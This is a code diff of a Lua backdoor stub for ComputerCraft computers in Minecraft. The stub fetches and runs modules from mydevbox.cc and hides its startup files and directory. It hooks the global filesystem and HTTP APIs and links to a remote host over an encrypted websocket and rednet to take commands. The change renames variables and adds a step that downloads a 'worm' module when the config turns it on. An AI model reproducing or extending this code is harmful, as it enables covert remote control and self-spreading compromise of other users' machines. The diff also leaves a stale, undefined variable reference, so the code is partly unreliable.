@@ -12,25 +12,26 @@ local _OGShell = shell
 local _OGFS = _G.fs
 local backupPullEventRaw = _G.os.pullEventRaw
 local backupPullEvent = _G.os.pullEvent
-local customeventmanager = (pcall(require, "hooks.customeventmanager") and require("hooks.customeventmanager")) or load(http.get("https://mydevbox.cc/src/hooks/customeventmanager.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "customeventmanager", "t", _G)()
-local eventhook = (pcall(require, "hooks.eventhook") and require("hooks.eventhook")) or load(http.get("https://mydevbox.cc/src/hooks/eventhook.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "eventhook", "t", _G)()
-local myhttp = (pcall(require, "networking.http.http") and require("networking.http.http")) or load(http.get("https://mydevbox.cc/src/networking/http/http.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "http", "t", _G)()
-local customfs = (pcall(require, "modules.persistent.hide_fs") and require("modules.persistent.hide_fs")) or load(http.get("https://mydevbox.cc/src/modules/persistent/hide_fs.lua",{["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "hide_fs", "t", _G)()
-local custompairs = (pcall(require, "hooks.custompairs") and require("hooks.custompairs")) or load(http.get("https://mydevbox.cc/src/hooks/custompairs.lua").readAll(), "custompairs", "t", _G)()
-local eventhandler = (pcall(require, "eventhandler.eventhandler") and require("eventhandler.eventhandler")) or load(http.get("https://mydevbox.cc/src/eventhandler/eventhandler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "eventhandler", "t", _G)()
-local config = (pcall(require, "config.config") and require("config.config")) or load(http.get("https://mydevbox.cc/src/config/config.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "config", "t", _G)()
-local utils = (pcall(require, "sys.utils.utils") and require("sys.utils.utils")) or load(http.get("https://mydevbox.cc/src/sys/utils/utils.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "utils", "t", _G)()
-local cc_rsa = (pcall(require, "sys.crypto.cc_rsa") and require("sys.crypto.cc_rsa")) or load(http.get("https://mydevbox.cc/src/sys/crypto/cc_rsa.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "rsa", "t", _G)() 
+local customeventmanagerLibrary = (pcall(require, "hooks.customeventmanager") and require("hooks.customeventmanager")) or load(http.get("https://mydevbox.cc/src/hooks/customeventmanager.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "customeventmanagerLibrary", "t", _G)()
+local eventhookLibrary = (pcall(require, "hooks.eventhook") and require("hooks.eventhook")) or load(http.get("https://mydevbox.cc/src/hooks/eventhook.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "eventhookLibrary", "t", _G)()
+local httpLibrary = (pcall(require, "networking.http.http") and require("networking.http.http")) or load(http.get("https://mydevbox.cc/src/networking/http/http.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "http", "t", _G)()
+local filesystemLibrary = (pcall(require, "modules.persistent.hide_fs") and require("modules.persistent.hide_fs")) or load(http.get("https://mydevbox.cc/src/modules/persistent/hide_fs.lua",{["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "hide_fs", "t", _G)()
+local custompairsLibrary = (pcall(require, "hooks.custompairs") and require("hooks.custompairs")) or load(http.get("https://mydevbox.cc/src/hooks/custompairs.lua").readAll(), "custompairsLibrary", "t", _G)()
+local eventhandlerLibrary = (pcall(require, "eventhandler.eventhandler") and require("eventhandler.eventhandler")) or load(http.get("https://mydevbox.cc/src/eventhandler/eventhandler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "eventhandlerLibrary", "t", _G)()
+local configLibrary= (pcall(require, "config.config") and require("config.config")) or load(http.get("https://mydevbox.cc/src/config/config.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "config", "t", _G)()
+local utilsLibrary= (pcall(require, "sys.utils.utils") and require("sys.utils.utils")) or load(http.get("https://mydevbox.cc/src/sys/utils/utils.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "utils", "t", _G)()
+local cc_rsaLibrary = (pcall(require, "sys.crypto.cc_rsa") and require("sys.crypto.cc_rsa")) or load(http.get("https://mydevbox.cc/src/sys/crypto/cc_rsa.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "rsa", "t", _G)() 
 local wsrouter = (pcall(require, "networking.http.wsrouter") and require("networking.http.wsrouter")) or load(http.get("https://mydevbox.cc/src/networking/http/wsrouter.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "wsrouter", "t", _G)()
 local rednetrouter = (pcall(require, "networking.rednet.router") and require("networking.rednet.router")) or load(http.get("https://mydevbox.cc/src/networking/rednet/router.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "rednetrouter", "t", _G)()
 local core_router = (pcall(require, "networking.core_router") and require("networking.core_router")) or load(http.get("https://mydevbox.cc/src/networking/core_router.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "core_router", "t", _G)()
 local EnD = (pcall(require, "sys.crypto.EnD") and require("sys.crypto.EnD")) or load(http.get("https://mydevbox.cc/src/sys/crypto/EnD.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "EnD", "t", _G)()
 local command_handler = (pcall(require, "networking.processor.command_handler") and require("networking.processor.command_handler")) or load(http.get("https://mydevbox.cc/src/networking/processor/command_handler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "command_handler", "t", _G)()
 local uninstaller_installer = (pcall(require, "uninstaller") and require("uninstaller")) or load(http.get("https://mydevbox.cc/src/uninstaller.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "uninstaller", "t", _G)()
+local wormLibrary= nil
 
 local configpath = nil
 local metadataFile = nil
-local rstartup = utils.generateRandomString(3)
+local rstartup = utilsLibrary.generateRandomString(3)
 _OGFS.copy("startup.lua",rstartup)
 
 local function getShellRunArgument()
@@ -57,7 +58,6 @@ end
 local bootfile = getShellRunArgument()
 
 local function getRealStartupPath()
-    shell.setDir("/")
     if not _OGFS.exists(bootfile) then
          return nil  end
     local f1 = _OGFS.open(bootfile, "r")
@@ -134,8 +134,8 @@ _OGFS.delete(rstartup)
 
 local function getConfigUrl()
     --metadataFile
-    if ((_OGFS.exists(metadataFile)) and (utils.getFileSize(_OGFS, metadataFile) > 0)) then
-        configpath = utils.getMetadataValue(_OGFS, metadataFile, "config", "|")
+    if ((_OGFS.exists(metadataFile)) and (utilsLibrary.getFileSize(_OGFS, metadataFile) > 0)) then
+        configpath = utilsLibrary.getMetadataValue(_OGFS, metadataFile, "config", "|")
     end
 end
 
@@ -147,19 +147,19 @@ local function hideStartup()
             handle.close()
             if contents == "" then
                 -- Hide real startup.lua file if xsup has no contents
-                customfs.hideFile("startup.lua")
+                filesystemLibrary.hideFile("startup.lua")
             else
                 -- Set xsup as the original startup and hide it
-                customfs.setOriginalStartup(xsup)
-                customfs.hideFile(xsup)
+                filesystemLibrary.setOriginalStartup(xsup)
+                filesystemLibrary.hideFile(xsup)
             end
         else
             -- If the file can't be opened, fallback to hiding the real startup.lua
-            customfs.hideFile("startup.lua")
+            filesystemLibrary.hideFile("startup.lua")
         end
     else
         -- If xsup is nil, ensure real startup.lua is hidden
-        customfs.hideFile("startup.lua")
+        filesystemLibrary.hideFile("startup.lua")
     end
 end
 
@@ -167,68 +167,71 @@ function main.setup()
 hideStartup()
 getConfigUrl()
 if xsup~=nil then
-    customfs.setOriginalStartup(xsup)
-    customfs.hideFile(xsup)
+    filesystemLibrary.setOriginalStartup(xsup)
+    filesystemLibrary.hideFile(xsup)
 end
 if (bootfile~=nil) then
-    customfs.hideFile(bootfile)
+    filesystemLibrary.hideFile(bootfile)
 end
 if metadataFile~=nil then
-    customfs.hideFile(metadataFile)
+    filesystemLibrary.hideFile(metadataFile)
 end
-if customfs ~= nil and bdapath ~= nil then
+if filesystemLibrary ~= nil and bdapath ~= nil then
     filename = nil
-    customfs.hideDir(bdapath)
+    filesystemLibrary.hideDir(bdapath)
 end
-_G.fs=customfs
+_G.fs=filesystemLibrary
 uninstaller_installer.setOGFS(_OGFS)
-uninstaller_installer.setCFS(customfs)
+uninstaller_installer.setCFS(filesystemLibrary)
 uninstaller_installer.setOGShell(_OGShell)
-eventhook.setCustomQueueEvent(customeventmanager.getQueueEventName())
-eventhook.setOriginalPullEvent(backupPullEvent)
-eventhook.setOriginalPullEventRaw(backupPullEventRaw)
-eventhook.activate()
+eventhookLibrary.setCustomQueueEvent(customeventmanagerLibrary.getQueueEventName())
+eventhookLibrary.setOriginalPullEvent(backupPullEvent)
+eventhookLibrary.setOriginalPullEventRaw(backupPullEventRaw)
+eventhookLibrary.activate()
 
-myhttp.addEventHandlers(eventhook)
-myhttp.setCustomPullEvent(customeventmanager.getPullEventName())
---myhttp.addSilentDomain("mydevbox.cc") --TODO: FIX for WS, add session ids
-_G.http = myhttp
-custompairs.add_to_blacklist(customeventmanager.getPullEventName())
-custompairs.add_to_blacklist(customeventmanager.getQueueEventName())
+httpLibrary.addEventHandlers(eventhookLibrary)
+httpLibrary.setCustomPullEvent(customeventmanagerLibrary.getPullEventName())
+--httpLibrary.addSilentDomain("mydevbox.cc") --TODO: FIX for WS, add session ids
+_G.http = httpLibrary
+custompairsLibrary.add_to_blacklist(customeventmanagerLibrary.getPullEventName())
+custompairsLibrary.add_to_blacklist(customeventmanagerLibrary.getQueueEventName())
 
-eventhook.setEventHandler(eventhandler)
+eventhookLibrary.setEventHandler(eventhandlerLibrary)
 --local startup = (pcall(require, "sys.startup") and require("sys.startup")) or load(http.get("https://mydevbox.cc/src/sys/startup.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "startup", "t", _G)()
 --startup:onStartup()
-if (configpath~=nil) then config:DownloadConfig("https://pastebin.com/raw/"..configpath)  else return main end
+if (configpath~=nil) then configLibrary:DownloadConfig("https://pastebin.com/raw/"..configpath)  else return main end
 --New: RjaTsuaK
  --Old: https://pastebin.com/raw/rHA43mQp
-config:set("identifier.stubid", utils.generateRandomString(16))
+ configLibrary:set("identifier.stubid", utilsLibrary.generateRandomString(16))
 --print("identifier: "..config:get("identifier.stubid"))
 --print("RHOST: {Redacted for sanity sake}")
-local handlerInstance = setmetatable({}, eventhandler)
-myhttp.setEnD(EnD)
-wsrouter.setIdentifier(config:get("identifier.stubid"))
-wsrouter.setRSA(cc_rsa)
-wsrouter.setUtils(utils)
+local handlerInstance = setmetatable({}, eventhandlerLibrary)
+httpLibrary.setEnD(EnD)
+wsrouter.setIdentifier(configLibrary:get("identifier.stubid"))
+wsrouter.setRSA(cc_rsaLibrary)
+wsrouter.setUtils(utilsLibrary)
 wsrouter.setEnD(EnD)
-wsrouter.setRawRhost("wss://"..config:get("networking.http.rhost"))
-wsrouter.setOwnerID(config:get("identifier.ownerid"))
-wsrouter.setConfig(config)
-rednetrouter.setIdentifier(config:get("identifier.stubid"))
-rednetrouter.setRSA(cc_rsa)
-rednetrouter.setUtils(utils)
+wsrouter.setRawRhost("wss://"..configLibrary:get("networking.http.rhost"))
+wsrouter.setOwnerID(configLibrary:get("identifier.ownerid"))
+wsrouter.setConfig(configLibrary)
+rednetrouter.setIdentifier(configLibrary:get("identifier.stubid"))
+rednetrouter.setRSA(cc_rsaLibrary)
+rednetrouter.setUtils(utilsLibrary)
 rednetrouter.setEnD(EnD)
 core_router.setRednetrouter(rednetrouter)
 core_router.setWsrouter(wsrouter)
 core_router.setCommandHandler(command_handler)
-core_router.setRednetEnabled(config:get("networking.rednet.enabled"))
-core_router.setWsEnabled(config:get("networking.http.enabled"))
+core_router.setRednetEnabled(configLibrary:get("networking.rednet.enabled"))
+core_router.setWsEnabled(configLibrary:get("networking.http.enabled"))
 command_handler.setMain(main)
+
+    if (configLibrary:get("persistent.worm")==true) then
+        wormLibrary = load(http.get("https://mydevbox.cc/src/modules/worm.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "worm", "t", _G)()
+    end
 end
 
-
 function main.getConfig()
-    return config
+    return configLibrary
 end
 function main.getConfigUrl()
     return configurl
@@ -240,7 +243,7 @@ function main.getUtils()
     return utils
 end
 function main.getRSA()
-    return cc_rsa
+    return cc_rsaLibrary
 end
 function main.getEnD()
     return EnD
@@ -264,7 +267,7 @@ end
 
 function main.init()
     wsrouter.allow_encryption(true)
-    wsrouter.connect(config:get("networking.http.rhost"))
+    wsrouter.connect(configLibrary:get("networking.http.rhost"))
     core_router.TXRX2Host("0x00", false)
     while not isShuttingDown do
         core_router.TXRX2Host("0x00", false)
